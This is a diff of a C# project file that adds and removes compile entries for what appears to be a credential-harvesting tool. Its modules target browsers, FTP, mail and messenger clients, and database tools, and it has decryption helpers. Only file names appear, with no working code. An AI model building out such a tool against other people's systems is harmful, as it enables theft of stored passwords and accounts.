@@ -19,7 +19,7 @@
     <DebugType>full</DebugType>
     <Optimize>false</Optimize>
     <OutputPath>bin\Debug\</OutputPath>
-    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DefineConstants>TRACE;DEBUG</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
@@ -45,13 +45,16 @@
     <Compile Include="Browsers\FireFox.cs" />
     <Compile Include="Browsers\IE.cs" />
     <Compile Include="Browsers\OldSogou.cs" />
+    <Compile Include="FTP\CoreFTP.cs" />
     <Compile Include="FTP\FileZilla.cs" />
+    <Compile Include="FTP\Snowflake.cs" />
     <Compile Include="FTP\WinSCP.cs" />
     <Compile Include="Helper\AesGcm.cs" />
     <Compile Include="Helper\Asn1Der.cs" />
-    <Compile Include="Helper\BCrypt.cs" />
     <Compile Include="Browsers\Chrome.cs" />
+    <Compile Include="Helper\Blowfish.cs" />
     <Compile Include="Helper\decryptMoz3DES.cs" />
+    <Compile Include="Helper\Navicat11Cipher.cs" />
     <Compile Include="Helper\Pixini.cs" />
     <Compile Include="Helper\LockedFile.cs" />
     <Compile Include="Helper\Methods.cs" />
@@ -60,21 +63,16 @@
     <Compile Include="Helper\Native.cs" />
     <Compile Include="Helper\Pbkdf2.cs" />
     <Compile Include="Helper\RC4Crypt.cs" />
-    <Compile Include="Helper\tar-cs\DataWriter.cs" />
-    <Compile Include="Helper\tar-cs\IArchiveDataWriter.cs" />
-    <Compile Include="Helper\tar-cs\ITarHeader.cs" />
-    <Compile Include="Helper\tar-cs\LegacyTarWriter.cs" />
-    <Compile Include="Helper\tar-cs\TarException.cs" />
-    <Compile Include="Helper\tar-cs\TarHeader.cs" />
-    <Compile Include="Helper\tar-cs\TarWriter.cs" />
-    <Compile Include="Helper\tar-cs\UsTarHeader.cs" />
-    <Compile Include="Helper\Tar.cs" />
     <Compile Include="Helper\TripleDESHelper.cs" />
-    <Compile Include="Helper\VaultCli.cs" />
+    <Compile Include="Helper\ZipStorer.cs" />
     <Compile Include="Mails\Foxmail.cs" />
+    <Compile Include="Mails\MailBird.cs" />
     <Compile Include="Mails\MailMaster.cs" />
+    <Compile Include="Mails\Outlook.cs" />
     <Compile Include="Messengers\DingTalk.cs" />
+    <Compile Include="Messengers\Discord.cs" />
     <Compile Include="Messengers\Enigma.cs" />
+    <Compile Include="Messengers\Line.cs" />
     <Compile Include="Messengers\QQ.cs" />
     <Compile Include="Messengers\Skype.cs" />
     <Compile Include="Messengers\Telegram.cs" />
@@ -84,6 +82,7 @@
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Helper\SQLiteHandler.cs" />
     <Compile Include="Softwares\NeteaseCloudMusic.cs" />
+    <Compile Include="Tools\DBeaver.cs" />
     <Compile Include="Tools\FinalShell.cs" />
     <Compile Include="Tools\MobaXterm.cs" />
     <Compile Include="Tools\Navicat.cs" />
